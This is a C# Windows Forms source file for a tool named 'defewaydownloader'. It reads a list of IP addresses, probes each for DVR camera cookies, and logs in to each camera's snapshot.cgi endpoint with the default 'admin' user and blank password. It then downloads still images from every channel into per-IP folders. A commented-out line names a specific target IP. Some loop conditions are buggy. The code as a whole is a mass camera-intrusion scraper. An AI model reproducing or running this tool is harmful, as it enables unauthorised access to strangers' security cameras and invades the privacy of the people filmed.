using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Reflection;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace defewaydownloader
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        public string inputFileName;
        public string inputSafeFileName;
        public string selectedDirectory = Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location) + @"\img\";
        public string[] lines;
        public int filelengh;

        public class MyWebClient : WebClient
        {
            protected override WebRequest GetWebRequest(Uri address)
            {
                var req = base.GetWebRequest(address);
                req.Timeout = 5000;
                return req;
            }
        }

        public string getCamCount(Uri uri)
        {
            string count = "";

            using (MyWebClient client = new MyWebClient())
            {
                int br = 0;
                bool found = false;
                while (found == false)
                {
                    int position = 0;
                    var cookies = new CookieContainer();
                    WebBrowser w = new WebBrowser();
                    w.Navigate(uri);

                    try
                    {
                        if(br == 30)
                        {
                            count = "-1";
                            return count;
                        }

                        var cookie = w.Document.Cookie;
                        string[] cookiestring = cookie.Split(';');
                        for (int i = 0; i == cookiestring.Length; i++)
                        {
                            if (cookiestring[i].Contains("dvr_camcnt"))
                            {
                                position = i;
                                count = position.ToString();
                            }
                            else
                            {

                            }
                        }
                        string camcount = cookiestring[position].Replace("dvr_camcnt=", "");
                        found = true;
                        //Console.WriteLine(camcount);
                    }
                    catch
                    {
                        Thread.Sleep(10);
                        br++;
                        //Console.WriteLine(br);
                    }
                    Thread.Sleep(100);
                }

            }

            return count;
        }

        private void button3_Click(object sender, EventArgs e)
        {
            //Console.WriteLine(getCamCount(new Uri(@"http://99.148.135.79:8000")));
            string[] Ofirstsplit = lines.Take(lines.Length / 2).ToArray();
            string[] Osecondsplit = lines.Skip(lines.Length / 2).ToArray();

            string[] firstsplit = Ofirstsplit.Take(Ofirstsplit.Length / 2).ToArray();
            string[] secondsplit = Ofirstsplit.Skip(Ofirstsplit.Length / 2).ToArray();
            string[] thirdsplit = Osecondsplit.Take(Osecondsplit.Length / 2).ToArray();
            string[] forthsplit = Osecondsplit.Skip(Osecondsplit.Length / 2).ToArray();

            Thread a = new Thread(() => testthread(firstsplit));
            Thread b = new Thread(() => testthread(secondsplit));
            Thread c = new Thread(() => testthread(thirdsplit));
            Thread d = new Thread(() => testthread(forthsplit));
            a.IsBackground = true;
            b.IsBackground = true;
            c.IsBackground = true;
            d.IsBackground = true;
            a.SetApartmentState(ApartmentState.STA);
            b.SetApartmentState(ApartmentState.STA);
            c.SetApartmentState(ApartmentState.STA);
            d.SetApartmentState(ApartmentState.STA);
            a.Start();
            b.Start();
            c.Start();
            d.Start();
        }

        public void testthread(string[] ips)
        {
            int len = ips.Length;

            Console.WriteLine("thread started");
            Console.WriteLine(len);

            foreach (string line in ips)
            { 
                Console.WriteLine(line);
                bool isIpGood;

                string curip = line;

                if (curip.EndsWith(":"))
                {
                    curip = curip.Remove(curip.Length - 1);
                }

                int camCount = Int32.Parse(getCamCount(new Uri("http://" + curip)));
                //Console.WriteLine(camCount);

                if(camCount == -1)
                {
                    Console.WriteLine("bad ip");
                    continue;
                }

                try
                {
                    using (MyWebClient client = new MyWebClient())
                    {
                        byte[] img = client.DownloadData("http://" + curip + "/cgi-bin/snapshot.cgi?chn=0&u=admin&p=");
                    }
                    isIpGood = true;
                }
                catch
                {
                    //incorrect user/pass or camera timeout. 
                    isIpGood = false;
                }

                if (isIpGood)
                {
                    for(int o = 0; o == camCount; o++)
                    {
                        string dirip = curip.Replace(':', ';');

                        string dir = selectedDirectory + dirip;

                        if (!Directory.Exists(dir))
                        {
                            Directory.CreateDirectory(dir);
                        }

                        using (MyWebClient client = new MyWebClient())
                        {
                            try
                            {
                                Console.WriteLine("downloading from " + curip + " channel " + o);
                                client.DownloadFile("http://" + curip + "/cgi-bin/snapshot.cgi?chn=" + o + "&u=admin&p=", dir + "/chnnel" + o + ".jpg");
                            }
                            catch
                            {
                                //error in download
                            }
                        }
                    }
                }
            }
        }

        private void button1_Click(object sender, EventArgs e)
        {
            using (var fbd = new FolderBrowserDialog())
            {
                DialogResult result = fbd.ShowDialog();

                if (result == DialogResult.OK && !string.IsNullOrWhiteSpace(fbd.SelectedPath))
                {
                    selectedDirectory = fbd.SelectedPath + "/";
                    button1.ForeColor = System.Drawing.Color.DarkGreen;
                }
            }
        }

        private void button2_Click(object sender, EventArgs e)
        {
            using (OpenFileDialog dlg = new OpenFileDialog())
            {
                dlg.Title = "Open Input File";
                dlg.Filter = "Text Files | *.txt";

                if (dlg.ShowDialog() == DialogResult.OK)
                {
                    inputSafeFileName = dlg.SafeFileName;
                    inputFileName = dlg.FileName;
                    lines = System.IO.File.ReadAllLines(inputFileName);
                    filelengh = lines.Count();
                    button2.ForeColor = System.Drawing.Color.DarkGreen;
                }
            }
        }
    }
}
